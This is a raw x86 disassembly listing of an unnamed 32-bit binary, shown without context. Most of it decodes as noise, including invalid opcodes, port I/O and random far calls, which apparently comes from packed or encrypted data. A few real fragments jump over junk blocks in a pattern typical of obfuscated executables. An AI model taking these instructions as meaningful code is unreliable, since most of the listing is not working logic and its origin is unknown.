  406b71:	jmp    0x406d50
  406b76:	cwde   
  406b77:	sahf   
  406b78:	inc    edi
  406b79:	mov    bh,0x41
  406b7b:	ja     0x406be5
  406b7d:	mov    cl,0xc9
  406b7f:	mov    DWORD PTR [ecx],0x3b16c55f
  406b85:	pop    eax
  406b86:	add    bh,BYTE PTR [ebx]
  406b88:	jle    0x406c08
  406b8a:	mov    esp,0x3b7e7e7f
  406b8f:	into   
  406b90:	pusha  
  406b91:	cmp    al,0xcc
  406b93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406b94:	xor    eax,DWORD PTR [edx+0x354184cd]
  406b9a:	aas    
  406b9b:	add    BYTE PTR [ebp-0x4fdbc8a4],ch
  406ba1:	jnp    0x406beb
  406ba3:	dec    edi
  406ba4:	xchg   esp,eax
  406ba5:	sbb    DWORD PTR [eax],eax
  406ba7:	ret    0xd95
  406baa:	test   bh,cl
  406bac:	rcr    BYTE PTR [edx-0x13a12ffb],1
  406bb2:	mov    ebx,DWORD PTR [ebp-0x76]
  406bb5:	pop    edi
  406bb6:	jb     0x406c31
  406bb8:	(bad)  
  406bba:	sbb    ebx,DWORD PTR ds:0xb1a1b809
  406bc0:	cli    
  406bc1:	fst    DWORD PTR [edx+eax*4-0x1c1ab189]
  406bc8:	jmp    0xc57fc887
  406bcd:	adc    cl,BYTE PTR [ebx-0x26]
  406bd0:	pop    es
  406bd1:	lds    ecx,FWORD PTR [ebp-0x48d87aad]
  406bd7:	ss cmp bl,al
  406bda:	pop    eax
  406bdb:	push   ebx
  406bdc:	in     eax,0x32
  406bde:	and    DWORD PTR [esi+edx*8+0x6f857f],0x881e0696
  406be9:	lods   eax,DWORD PTR ds:[esi]
  406bea:	mov    edi,0xd6da9bc3
  406bef:	push   ds
  406bf0:	jne    0x406c69
  406bf2:	jle    0x406c01
  406bf4:	jae    0x406c30
  406bf6:	adc    ah,0xf4
  406bf9:	mov    dl,0xfc
  406bfb:	xor    esp,edi
  406bfd:	retfw  
  406bff:	sub    dh,al
  406c01:	popa   
  406c02:	jmp    0x406bef
  406c04:	adc    edi,ecx
  406c06:	inc    edx
  406c07:	pop    ebp
  406c08:	mov    esi,0x6c3f4f75
  406c0d:	rol    DWORD PTR ds:0x915a927a,1
  406c13:	jg     0x406bb6
  406c15:	retf   0xcadd
  406c18:	add    DWORD PTR [ecx-0x405f7f2d],edi
  406c1e:	adc    eax,0x9cc40bfd
  406c23:	inc    edx
  406c24:	adc    ecx,DWORD PTR [edi]
  406c26:	stos   BYTE PTR es:[edi],al
  406c27:	out    0x5e,al
  406c29:	fidivr WORD PTR ds:0xd0e32794
  406c2f:	dec    ebx
  406c30:	mov    dh,0xc5
  406c32:	ret    0x170e
  406c35:	sti    
  406c36:	xor    eax,0x87074534
  406c3b:	push   eax
  406c3c:	aaa    
  406c3d:	sub    DWORD PTR [ebx+0x17],edi
  406c40:	jge    0x406c1e
  406c42:	out    0xd4,eax
  406c44:	jge    0x406cba
  406c46:	sub    DWORD PTR [eax],0x2f98eab0
  406c4c:	xchg   ebx,eax
  406c4d:	mov    WORD PTR [edi],gs
  406c4f:	inc    ebp
  406c50:	xor    edx,DWORD PTR [eax+edi*2-0x9]
  406c54:	sub    ebx,edi
  406c56:	pop    DWORD PTR [edi]
  406c58:	lods   eax,DWORD PTR cs:[esi]
  406c5a:	add    esp,ecx
  406c5c:	pop    edx
  406c5d:	xchg   ecx,eax
  406c5e:	or     al,BYTE PTR [ebx-0x5f38f1b7]
  406c64:	loop   0x406c08
  406c66:	cmp    eax,0x806cda0f
  406c6b:	int    0xde
  406c6d:	call   0x41c7:0xe1a4ddb0
  406c74:	fnstsw WORD PTR [esi+0x464b2579]
  406c7a:	ror    BYTE PTR [edx+0x52],1
  406c7d:	push   esi
  406c7e:	push   0xffffff99
  406c80:	push   ebx
  406c81:	retf   0x7b57
  406c84:	xchg   esi,eax
  406c85:	jae    0x406c2e
  406c87:	cld    
  406c88:	cli    
  406c89:	or     eax,0xcc15f5dd
  406c8e:	mov    al,ds:0x6951ad9f
  406c93:	fidivr WORD PTR [eax-0x78ba82c3]
  406c99:	stc    
  406c9a:	dec    eax
  406c9b:	sub    al,0x70
  406c9d:	loopne 0x406c9c
  406c9f:	and    al,0x7f
  406ca1:	jl     0x406c92
  406ca3:	cld    
  406ca4:	lds    ebp,FWORD PTR ds:0x30328bc3
  406caa:	sbb    DWORD PTR [eax],edx
  406cac:	jns    0x406d17
  406cae:	push   ds
  406caf:	aaa    
  406cb0:	mov    ebp,0x252af1da
  406cb5:	call   0xe562:0xe5e40e9c
  406cbc:	pop    ecx
  406cbd:	push   es
  406cbe:	xor    al,0xb9
  406cc0:	xor    al,dl
  406cc2:	rcl    ch,1
  406cc4:	cmp    BYTE PTR [ebp+eax*8-0x72cca9db],dh
  406ccb:	push   0x47684fd3
  406cd0:	icebp  
  406cd1:	je     0x406c82
  406cd3:	add    eax,0x6ef6cfc9
  406cd8:	inc    ebp
  406cd9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406cda:	sbb    eax,0xcac7530e
  406cdf:	test   BYTE PTR [ebp-0x7a8a6ad3],0x75
  406ce6:	shl    DWORD PTR [esi-0x1e],cl
  406ce9:	arpl   WORD PTR [edx-0x3608e907],bp
  406cef:	mov    eax,ds:0x5f234707
  406cf4:	in     al,dx
  406cf5:	lock jecxz 0x406d1f
  406cf8:	add    eax,0xd09c5287
  406cfd:	or     BYTE PTR [ebx],dl
  406cff:	scas   al,BYTE PTR es:[edi]
  406d00:	xchg   esi,eax
  406d01:	mov    esp,ds
  406d03:	repnz sub eax,0xe66e990a
  406d09:	dec    si
  406d0b:	jl     0x406cb3
  406d0d:	or     edi,esp
  406d0f:	xchg   ecx,eax
  406d10:	lods   eax,DWORD PTR ds:[esi]
  406d11:	das    
  406d12:	dec    esi
  406d13:	add    eax,0x3ffd05ea
  406d18:	xchg   edx,eax
  406d19:	add    DWORD PTR [eax+0x34],edx
  406d1c:	and    DWORD PTR [ebp-0x72],edi
  406d1f:	scas   al,BYTE PTR es:[edi]
  406d20:	mov    al,ds:0xabe9e773
  406d25:	jg     0x406d25
  406d27:	xlat   BYTE PTR ds:[ebx]
  406d28:	shl    bl,cl
  406d2a:	ja     0x406d18
  406d2c:	push   ebp
  406d2d:	mov    cl,BYTE PTR [esi-0x47]
  406d30:	test   BYTE PTR ds:0xbfdc145f,dh
  406d36:	shl    DWORD PTR [ebx+0x64],0x97
  406d3a:	add    bh,BYTE PTR [ebp-0x1afb6a]
  406d40:	dec    edi
  406d41:	add    edx,DWORD PTR [ebp+0x22]
  406d44:	dec    esp
  406d45:	and    eax,0x54addc86
  406d4a:	mov    gs,WORD PTR [esi]
  406d4c:	mov    esi,0x666f7bab
  406d51:	xor    eax,ecx
  406d53:	mov    ecx,0x3b02
  406d58:	sbb    DWORD PTR ds:0x4338af,0x433793
  406d62:	add    ax,cx
  406d65:	add    DWORD PTR ds:0x4338a3,0x7d57
  406d6f:	mov    ecx,DWORD PTR [ebp+0x8]
  406d72:	movzx  eax,ax
  406d75:	sbb    DWORD PTR ds:0x4337e3,0x43378f
  406d7f:	jmp    0x406f5e
  406d84:	cmp    DWORD PTR [ebx],ebp
  406d86:	es fdivrp st(4),st
  406d89:	repz shr DWORD PTR [ecx],0x6c
  406d8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d8e:	pop    esi
  406d8f:	xor    al,0x67
  406d91:	shl    DWORD PTR [edi],1
  406d93:	stos   DWORD PTR es:[edi],eax
  406d94:	inc    eax
  406d95:	cmp    BYTE PTR [esi+0x7e],bh
  406d98:	mov    esp,0x3c7e7e7f
  406d9d:	data16 xlat BYTE PTR ds:[ebx]
  406d9f:	aad    0xa6
  406da1:	shl    edi,0x40
  406da4:	mov    al,0xbc
  406da6:	popa   
  406da7:	mov    dh,0x68
  406da9:	sub    DWORD PTR [esp+edi*1+0x679ded1f],0x3123a8ec
  406db4:	pop    ebp
  406db5:	push   edi
  406db6:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406db8:	xor    ah,BYTE PTR [ebp+0x21648727]
  406dbe:	add    bl,BYTE PTR [ebp+ecx*4-0x531e9489]
  406dc5:	mov    eax,ds:0x11761323
  406dca:	loope  0x406db5
  406dcc:	sbb    BYTE PTR [ebx],cl
  406dce:	add    ecx,ebp
  406dd0:	aas    
  406dd1:	jo     0x406d6a
  406dd3:	aas    
  406dd4:	cdq    
  406dd5:	jno    0x406e13
  406dd7:	mov    ds:0x147b216d,al
  406ddc:	and    dh,bh
  406dde:	sahf   
  406ddf:	push   edi
  406de0:	mov    WORD PTR ds:0x8711fa72,?
  406de6:	sti    
  406de7:	add    dh,BYTE PTR [esi]
  406de9:	push   ds
  406dea:	sbb    edi,eax
  406dec:	xor    al,0x92
  406dee:	inc    ebx
  406def:	pop    ecx
  406df0:	push   esi
  406df1:	shl    BYTE PTR [eax],1
  406df3:	mov    DWORD PTR [ecx],esi
  406df5:	popf   
  406df6:	dec    DWORD PTR [ebp-0x4920765b]
  406dfc:	data16 scas al,BYTE PTR es:[edi]
  406dfe:	cmp    eax,0x8504cb77
  406e03:	xor    ebp,esp
  406e05:	pop    es
  406e06:	clc    
  406e07:	sbb    BYTE PTR [ebp+0x1da18419],ah
  406e0d:	mov    ecx,0x923a7213
  406e12:	stos   DWORD PTR es:[edi],eax
  406e13:	mov    ecx,0x714acfec
  406e18:	and    al,0xf5
  406e1a:	cmp    bl,ah
  406e1c:	xchg   esi,eax
  406e1d:	out    dx,eax
  406e1e:	(bad)  
  406e1f:	std    
  406e20:	sub    eax,0x7d017e9c
  406e25:	mov    dl,0x2b
  406e27:	sbb    dh,0xd5
  406e2a:	iret   
  406e2b:	jle    0x406ea3
  406e2d:	adc    edi,ebx
  406e2f:	clc    
  406e30:	(bad)  
  406e31:	mov    bh,0xbd
  406e33:	push   es
  406e34:	lods   al,BYTE PTR ds:[esi]
  406e35:	push   cs
  406e36:	mov    edx,0x5974fa87
  406e3b:	pop    ebx
  406e3c:	add    ebp,DWORD PTR ds:0xc9cdd918
  406e42:	mov    cl,0xe2
  406e44:	rcl    BYTE PTR [edx],1
  406e46:	sbb    DWORD PTR [ecx],0xd7299fa6
  406e4c:	or     al,0x2b
  406e4e:	popa   
  406e4f:	into   
  406e50:	loope  0x406ea0
  406e52:	mov    ecx,0xdc1590fa
  406e57:	sbb    DWORD PTR [esi*1-0x2dc9c35c],edx
  406e5e:	enter  0xdbb4,0x61
  406e62:	jnp    0x406e38
  406e64:	mov    edx,0x94b77de
  406e69:	inc    eax
  406e6a:	pop    ecx
  406e6b:	push   esi
  406e6c:	xor    al,0x7c
  406e6e:	out    dx,al
  406e6f:	pusha  
  406e70:	je     0x406ec0
  406e72:	inc    ebx
  406e73:	push   es
  406e74:	xor    BYTE PTR [edi],dl
  406e76:	arpl   bx,si
  406e78:	adc    eax,0x5dfc83c8
  406e7d:	ror    DWORD PTR [eax+0x4cc6a60e],cl
  406e83:	sbb    esi,DWORD PTR [edx+0x24ae6a67]
  406e89:	or     ch,BYTE PTR [edx+eiz*1-0x3cc6e513]
  406e90:	ja     0x406e74
  406e92:	push   esi
  406e93:	pop    es
  406e94:	dec    edi
  406e95:	mov    eax,ds:0x62aebee2
  406e9a:	push   0xffffff9f
  406e9c:	lahf   
  406e9d:	sub    edx,ebx
  406e9f:	push   ecx
  406ea0:	pop    ds
  406ea1:	cwde   
  406ea2:	clc    
  406ea3:	dec    eax
  406ea4:	or     BYTE PTR [edx-0x46],al
  406ea7:	adc    eax,0xec6dee4c
  406eac:	pop    esi
  406ead:	test   eax,0x8d2557f4
  406eb2:	das    
  406eb3:	and    eax,0xa6a1a471
  406eb8:	jno    0x406f20
  406eba:	fs iret 
  406ebc:	sub    al,0x78
  406ebe:	cwde   
  406ebf:	push   0x3c
  406ec1:	mov    al,cs:0x600defd2
  406ec7:	mov    dl,0xb5
  406ec9:	jo     0x406e99
  406ecb:	shl    DWORD PTR ds:0x44039be4,0x1f
  406ed2:	int    0x4b
  406ed4:	and    eax,0xaae969b9
  406ed9:	lahf   
  406eda:	push   cs
  406edb:	add    bh,BYTE PTR [edx+0x39]
  406ede:	or     BYTE PTR [eax],0x65
  406ee1:	pop    ebp
  406ee2:	or     DWORD PTR [edi],ecx
  406ee4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406ee5:	xlat   BYTE PTR ds:[ebx]
  406ee6:	and    BYTE PTR [eax],0x68
  406ee9:	pop    ebx
  406eea:	bound  esp,QWORD PTR [ebx+ebx*4-0x6086563d]
  406ef1:	mov    ch,0xba
  406ef3:	ret    0x1d6a
  406ef6:	jle    0x406ee9
  406ef8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406ef9:	push   edi
  406efa:	dec    eax
  406efb:	xchg   edi,eax
  406efc:	jle    0x406eba
  406efe:	hlt    
  406eff:	scas   al,BYTE PTR es:[edi]
  406f00:	(bad)  
  406f01:	adc    DWORD PTR [esi+0x77c89501],eax
  406f07:	sbb    BYTE PTR [eax+ebp*8],0xb9
  406f0b:	push   ecx
  406f0c:	icebp  
  406f0d:	das    
  406f0e:	fsubr  QWORD PTR [edx+0x10]
  406f11:	inc    ebx
  406f12:	jne    0x406f5c
  406f14:	(bad)  
  406f15:	and    bl,dh
  406f17:	scas   eax,DWORD PTR es:[edi]
  406f18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406f19:	push   ebx
  406f1a:	neg    ecx
  406f1c:	out    dx,eax
  406f1d:	xor    al,0x17
  406f1f:	dec    esi
  406f20:	inc    edx
  406f21:	xor    BYTE PTR [edx+edx*2],dl
  406f24:	div    DWORD PTR [esi-0x6ad4ff50]
  406f2a:	aad    0x95
  406f2c:	dec    esp
  406f2d:	aam    0xfe
  406f2f:	sbb    al,0xad
  406f31:	repnz xor BYTE PTR [ebp-0x5c],cl
  406f35:	sub    al,0x7f
  406f37:	lock loopne 0x406f26
  406f3a:	inc    edx
  406f3b:	jmp    0x96869f29
  406f40:	(bad)  
  406f42:	popa   
  406f43:	add    eax,0xb09b090d
  406f48:	std    
  406f49:	in     eax,0x7d
  406f4b:	lahf   
  406f4c:	xchg   DWORD PTR [edi],eax
  406f4e:	dec    edi
  406f4f:	sbb    al,BYTE PTR [edx+0x3b]
  406f52:	leave  
  406f53:	imul   edi,DWORD PTR [ebx-0x74],0x1e875404
  406f5a:	ja     0x406fbf
  406f5c:	call   0x8f25:0x81d0f7ec
  406f63:	aaa    
  406f64:	inc    ebx
  406f65:	add    bl,dl
  406f67:	aaa    
  406f68:	inc    ebx
  406f69:	add    BYTE PTR [ebx],ah
  406f6b:	add    DWORD PTR [ebx+0x189084d],ecx
  406f71:	jmp    0x406f7d
  406f76:	xor    DWORD PTR [ebp-0x4],0xe149eb8
  406f7d:	mov    ax,WORD PTR [ebp-0x8]
  406f81:	jmp    0x407160
  406f86:	dec    ebx
  406f87:	rcr    BYTE PTR [ecx],0x72
  406f8a:	mov    cl,0x73
  406f8c:	push   ecx
  406f8d:	loope  0x406f7e
  406f8f:	sahf   
  406f90:	adc    al,BYTE PTR ds:0xe96c9d4b
  406f96:	mov    es,esi
  406f98:	jle    0x407018
  406f9a:	mov    esp,0xc57e7e7f
  406f9f:	rcl    ecx,1
  406fa1:	loope  0x40701a
  406fa3:	popf   
  406fa4:	popf   
  406fa5:	enter  0x9305,0x12
  406fa9:	push   ds
  406faa:	adc    al,0xc5
  406fac:	jp     0x406f74
  406fae:	hlt    
  406faf:	push   0xb5074d82
  406fb4:	sub    eax,0xb1b919e0
  406fb9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406fba:	jmp    0x8ddb0074
  406fbf:	xchg   edi,eax
  406fc0:	rcl    ebx,1
  406fc2:	fadd   st,st(3)
  406fc4:	out    dx,eax
  406fc5:	aam    0x42
  406fc7:	addr16 pop ebp
  406fc9:	mov    esi,0xb5d2612
  406fce:	sbb    al,BYTE PTR [esi+0x6686474d]
  406fd4:	and    edi,ebp
  406fd6:	sub    BYTE PTR [ebp+0x7b7d88dd],cl
  406fdc:	dec    ecx
  406fdd:	add    edi,edx
  406fdf:	xchg   ecx,eax
  406fe0:	add    edi,DWORD PTR [esi+0xc]
  406fe3:	mov    esp,0xeacec788
  406fe8:	clc    
  406fe9:	pop    ebx
  406fea:	push   esi
  406feb:	enter  0xc66f,0xae
  406fef:	scas   al,BYTE PTR es:[edi]
  406ff0:	fmulp  st(2),st
  406ff2:	cmp    al,0xf9
  406ff4:	dec    ebx
  406ff5:	adc    edx,DWORD PTR [ebp-0x46]
  406ff8:	lods   eax,DWORD PTR ds:[esi]
  406ff9:	dec    eax
  406ffa:	ds lock wbinvd 
  406ffe:	mov    bh,0xfe
  407000:	xchg   esi,eax
  407001:	sbb    dh,dh
  407003:	or     ebx,ebx
  407005:	jmp    0x5a49ffed
  40700a:	outs   dx,DWORD PTR ds:[esi]
  40700b:	es aad 0x3d
  40700e:	jle    0x407013
  407010:	push   0x30
  407012:	sar    BYTE PTR [ecx+0x6df2bb8],0xb0
  407019:	es mov dl,0x6e
  40701c:	aam    0x9a
  40701e:	sbb    esp,DWORD PTR [esi-0x4e]
  407021:	je     0x40703d
  407023:	clc    
  407024:	js     0x406fd9
  407026:	jno    0x40701e
  407028:	mov    ch,al
  40702a:	jbe    0x406fcc
  40702c:	iret   
  40702d:	pushf  
  40702e:	stos   DWORD PTR es:[edi],eax
  40702f:	push   esi
  407030:	shl    BYTE PTR [edx],cl
  407032:	push   edi
  407033:	sbb    eax,0xafe05d23
  407038:	int    0xf2
  40703a:	and    BYTE PTR [ebp+edx*1+0x4],bl
  40703e:	daa    
  40703f:	sub    BYTE PTR [edi-0x58],bh
  407042:	xor    dl,dh
  407044:	mov    esi,0x3b62873a
  407049:	sub    BYTE PTR [edx+0x5e],ah
  40704c:	scas   al,BYTE PTR es:[edi]
  40704d:	or     BYTE PTR [edx],ah
  40704f:	add    DWORD PTR [ecx-0x7bdf27f1],ebx
  407055:	rol    DWORD PTR [ebx+ecx*2-0x21f0462f],0x4e
  40705d:	lods   al,BYTE PTR ds:[esi]
  40705e:	sbb    DWORD PTR [ebx],eax
  407060:	sbb    eax,0xde5945f9
  407065:	mov    WORD PTR [eax+0x59],ds
  407068:	in     al,dx
  407069:	ror    DWORD PTR [ebp+0x4f6b074],0x7c
  407070:	dec    esi
  407071:	dec    esp
  407072:	push   esi
  407073:	sbb    eax,0xa4d02cd5
  407078:	add    eax,0x12844aef
  40707d:	xor    BYTE PTR [ebp+0x10],dh
  407080:	dec    edi
  407081:	mov    esp,0x9adcfa70
  407086:	mov    dl,0x52
  407088:	push   0xffffff80
  40708a:	ins    BYTE PTR es:[edi],dx
  40708b:	xchg   edi,eax
  40708c:	ret    
  40708d:	lahf   
  40708e:	pop    esi
  40708f:	imul   edx,ebx,0x504715b7
  407095:	lahf   
  407096:	mov    DWORD PTR [edi-0x109f1d9d],ebp
  40709c:	pop    esi
  40709d:	in     eax,dx
  40709e:	fsub   QWORD PTR ds:0xa78178b9
  4070a4:	mov    dh,0x69
  4070a6:	pop    ebp
  4070a7:	pop    edi
  4070a8:	mov    cs,WORD PTR [ebx]
  4070aa:	inc    ebx
  4070ab:	and    BYTE PTR [ecx+0x41],0xde
  4070af:	gs dec edx
  4070b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4070b3:	inc    ebp
  4070b4:	add    DWORD PTR [edi],0x2b7d4a9c
  4070ba:	cmp    eax,0x2019fd8a
  4070bf:	adc    ch,BYTE PTR [ebx]
  4070c1:	das    
  4070c2:	lods   al,BYTE PTR ds:[esi]
  4070c3:	xor    eax,0x7d1d35da
  4070c8:	shl    ah,cl
  4070ca:	jle    0x40708a
  4070cc:	mov    ebp,0x7ce7f200
  4070d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4070d2:	fcom   QWORD PTR ds:0x8206580d
  4070d8:	(bad)  
  4070d9:	jbe    0x4070fb
  4070db:	jno    0x4070d1
  4070dd:	std    
  4070de:	add    DWORD PTR [eax-0x71d3b83b],ebp
  4070e4:	(bad)  
  4070e5:	jo     0x40706e
  4070e7:	pop    esi
  4070e8:	cdq    
  4070e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4070ea:	daa    
  4070eb:	mov    ecx,0xa40b49e6
  4070f0:	mov    al,ds:0x6a33a465
  4070f5:	sub    edi,DWORD PTR [edi-0x43]
  4070f8:	aaa    
  4070f9:	add    al,0x86
  4070fb:	ins    DWORD PTR es:[edi],dx
  4070fc:	mov    ch,0xb9
  4070fe:	inc    ebx
  4070ff:	mov    ecx,0x1b9bad5e
  407104:	mov    esp,0x3d649812
  407109:	es in  eax,dx
  40710b:	hlt    
  40710c:	fcmovne st,st(7)
  40710e:	repnz stos DWORD PTR es:[edi],eax
  407110:	jns    0x40717f
  407112:	rcr    DWORD PTR [edi+0x5582948],0x72
  407119:	xchg   DWORD PTR [edi+0x504977b6],esi
  40711f:	ss jbe 0x4070cd
  407122:	nop
  407123:	sbb    DWORD PTR [ecx+eax*1-0x66],0xa64f37b6
  40712b:	and    al,0x45
  40712d:	dec    BYTE PTR [ecx+0x2632372a]
  407133:	inc    esp
  407134:	dec    ebp
  407135:	dec    esi
  407136:	jecxz  0x407152
  407138:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407139:	lea    esi,[esi+edx*4+0x2]
  40713d:	mov    ah,0xf5
  40713f:	stc    
  407140:	push   edx
  407141:	shl    dl,cl
  407143:	cmp    DWORD PTR [ecx-0x5543a950],esi
  407149:	dec    esi
  40714a:	leave  
  40714b:	imul   esi,esi,0x50
  40714e:	pop    edi
  40714f:	sub    al,dh
  407151:	repz pusha 
  407153:	xchg   BYTE PTR [ebx],bl
  407155:	add    al,0x71
  407157:	inc    edi
  407158:	in     al,0xab
  40715a:	cld    
  40715b:	jl     0x407144
  40715d:	mov    edi,0x75ffddda
  407162:	or     al,ch
  407164:	jmp    0x407167
  407166:	add    BYTE PTR [eax],al
  407168:	test   eax,eax
  40716a:	jmp    0x407349
  40716f:	and    eax,0xb1edb090
  407174:	in     eax,dx
  407175:	popa   
  407176:	push   eax
  407177:	retf   
  407178:	xchg   BYTE PTR [ebx-0x74],dh
  40717b:	aad    0xab
  40717d:	xor    bh,BYTE PTR [esp+ecx*8]
  407180:	les    edi,FWORD PTR [esi+0x7e]
  407183:	mov    esp,0x97e7e7f
  407188:	cmp    eax,0x5a120608
  40718d:	mov    bl,0x0
  40718f:	pop    ebx
  407190:	sub    eax,0x765f26ff
  407195:	ss in  al,dx
  407197:	in     eax,dx
  407198:	sub    DWORD PTR ds:0xd86d5202,esi
  40719e:	repz ret 0xb97a
  4071a2:	cmp    eax,0x2c6f6000
  4071a7:	mov    cl,0xce
  4071a9:	les    edi,FWORD PTR ds:0x7e06c93f
  4071af:	in     eax,dx
  4071b0:	xchg   ebp,eax
  4071b1:	inc    ecx
  4071b2:	push   esp
  4071b3:	xchg   esp,eax
  4071b4:	adc    esi,DWORD PTR [edi+0x5]
  4071b7:	test   al,0xb6
  4071b9:	xchg   esp,edx
  4071bb:	movq   mm7,QWORD PTR [edi+0x546d3a56]
  4071c2:	pop    ebp
  4071c3:	scas   eax,DWORD PTR es:[edi]
  4071c4:	das    
  4071c5:	call   0xadd330a6
  4071ca:	adc    al,BYTE PTR [ebx]
  4071cc:	sub    BYTE PTR [ebp+0x5f912402],cl
  4071d2:	inc    ebx
  4071d3:	and    ecx,DWORD PTR [esp+esi*1+0x6527d55e]
  4071da:	dec    ecx
  4071db:	sar    cl,1
  4071dd:	arpl   WORD PTR ds:0x803f3e43,bp
  4071e3:	loope  0x407231
  4071e5:	add    BYTE PTR [eax+0x39],0x40
  4071e9:	xchg   esi,eax
  4071ea:	dec    ebp
  4071eb:	push   0xc4d023ab
  4071f0:	mov    al,ds:0xdcfc1dc0
  4071f5:	hlt    
  4071f6:	pop    edi
  4071f7:	aad    0x0
  4071f9:	dec    ebp
  4071fa:	add    BYTE PTR [ebp-0x57aea2fe],al
  407200:	test   al,dh
  407202:	or     BYTE PTR [esi+0x1e],al
  407205:	mov    BYTE PTR [ebx+0x68],0xdc
  407209:	push   edi
  40720a:	retf   
  40720b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40720c:	push   0x71
  40720e:	imul   esi,DWORD PTR [ebx],0xa
  407211:	dec    esp
  407212:	or     ah,BYTE PTR [esi+ecx*4-0x18]
  407216:	shr    DWORD PTR [edx-0x36e4d5f7],0xf0
  40721d:	clc    
  40721e:	xchg   ebx,eax
  40721f:	adc    eax,0x51dac4f5
  407224:	xor    DWORD PTR ds:0xff0a5da7,ebx
  40722a:	js     0x4071dd
  40722c:	sub    al,0x71
  40722e:	ror    esp,0x94
  407231:	cmc    
  407232:	sub    esp,DWORD PTR [ebp-0x1f]
  407235:	sbb    al,BYTE PTR [eax-0x11]
  407238:	cmp    al,BYTE PTR [esp+edx*2-0x3ff54bcd]
  40723f:	(bad)  
  407240:	xchg   ebx,eax
  407241:	lahf   
  407242:	jno    0x4071f3
  407244:	shl    DWORD PTR [ebx-0x5d],1
  407247:	or     al,0x17
  407249:	sub    DWORD PTR [edx+ebx*4],ecx
  40724c:	adc    eax,0x9d2f40ed
  407251:	xor    al,0x7e
  407253:	cmp    ebx,ebx
  407255:	cld    
  407256:	cmp    BYTE PTR [ebx-0x4623a020],al
  40725c:	aam    0xc8
  40725e:	(bad)  
  40725f:	repz dec ecx
  407261:	mov    cl,0x95
  407263:	cmp    BYTE PTR [edx+ebx*1],dl
  407266:	ss fs popa 
  407269:	fld    QWORD PTR [ebx+esi*2-0x1f]
  40726d:	xchg   esp,eax
  40726e:	xchg   BYTE PTR [ebx+esi*2],bl
  407271:	mov    ah,0xa2
  407273:	and    ah,BYTE PTR [edx-0x3afa0d8a]
  407279:	adc    DWORD PTR [ebx-0x40],edi
  40727c:	cmp    DWORD PTR [edx],esi
  40727e:	mov    ch,0x8d
  407280:	ins    BYTE PTR es:[edi],dx
  407281:	sub    ah,al
  407283:	stos   BYTE PTR es:[edi],al
  407284:	push   esp
  407285:	dec    edi
  407286:	push   edx
  407287:	jo     0x4072b1
  407289:	call   0x32290a54
  40728e:	stos   BYTE PTR es:[edi],al
  40728f:	je     0x407268
  407291:	das    
  407292:	div    esi
  407294:	jle    0x4072f8
  407296:	in     al,0x39
  407298:	cmc    
  407299:	push   0x96fec486
  40729e:	int3   
  40729f:	outs   dx,DWORD PTR ds:[esi]
  4072a0:	mov    dl,0xef
  4072a2:	repz cli 
  4072a4:	cmc    
  4072a5:	icebp  
  4072a6:	xchg   edx,eax
  4072a7:	pop    ds
  4072a8:	rcr    DWORD PTR [edx],0x6e
  4072ab:	add    al,0xa5
  4072ad:	das    
  4072ae:	repnz and BYTE PTR [ebx+0x415cd839],bh
  4072b5:	ss call 0xf0424af7
  4072bb:	pop    esi
  4072bc:	push   ss
  4072bd:	(bad)  
  4072bf:	pop    ecx
  4072c0:	lahf   
  4072c1:	xor    DWORD PTR [eax],ebp
  4072c3:	cdq    
  4072c4:	fwait
  4072c5:	push   0x2f
  4072c7:	xor    eax,0x4e1c6f49
  4072cc:	xchg   edi,eax
  4072cd:	sti    
  4072ce:	fdiv   st,st(1)
  4072d0:	hlt    
  4072d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4072d2:	jo     0x407264
  4072d4:	push   0x966f7ef6
  4072d9:	mov    ebp,0x541f2e90
  4072de:	or     BYTE PTR [ebp-0x6f],0x9a
  4072e2:	(bad)  [ebx+0x2d71b87c]
  4072e8:	sub    eax,0x58781284
  4072ed:	adc    eax,edx
  4072ef:	push   0xff867d8c
  4072f4:	xchg   BYTE PTR [ebp+0x35],dh
  4072f7:	jmp    0x56ff82b1
  4072fc:	jb     0x407288
  4072fe:	xchg   ecx,esi
  407300:	shl    esi,cl
  407302:	pop    edx
  407303:	ror    bh,0x6d
  407306:	xor    BYTE PTR [ecx],ah
  407308:	pop    edx
  407309:	sbb    BYTE PTR [esi+0x7],dh
  40730c:	in     eax,dx
  40730d:	mov    BYTE PTR [ebx-0x4b629566],dh
  407313:	ret    
  407314:	dec    ebp
  407315:	add    DWORD PTR es:[esi+0xe],esp
  407319:	pop    edi
  40731a:	mov    dl,0xb9
  40731c:	mov    ecx,0x5d5f0846
  407321:	lock dec esi
  407323:	mov    eax,0xf51f594b
  407328:	cmp    DWORD PTR [edx+0x3b],ebp
  40732b:	daa    
  40732c:	rol    BYTE PTR [esi+0x35],cl
  40732f:	sub    dl,BYTE PTR [edx+edx*2]
  407332:	inc    edi
  407333:	les    ebx,FWORD PTR [ecx+0x14ceb74c]
  407339:	inc    eax
  40733a:	add    bl,BYTE PTR [edx-0x44aebefd]
  407340:	fmul   QWORD PTR [ebp+0x7a16f2e7]
  407346:	sbb    eax,0x840fe444
  40734b:	daa    
  40734c:	cld    
  40734d:	(bad)  
  40734e:	dec    ecx
  407350:	ret    0x4
  407353:	push   ebp
  407354:	mov    ebp,esp
  407356:	sub    esp,0x2c
  407359:	and    DWORD PTR ds:0x4337d7,0x5787
  407363:	mov    DWORD PTR [ebp-0x8],0xf89c8532
  40736a:	mov    eax,ds:0x4338ab
  40736f:	or     DWORD PTR ds:0x4338af,eax
  407375:	jmp    0x40759d
  40737a:	pop    edx
  40737b:	cmp    al,0x59
  40737d:	inc    ebx
  40737e:	pop    ecx
  40737f:	arpl   WORD PTR [eax-0x1b],sp
  407382:	js     0x407389
  407384:	push   esi
  407385:	loope  0x407329
  407387:	stos   BYTE PTR es:[edi],al
  407388:	repnz add ecx,DWORD PTR [edx]
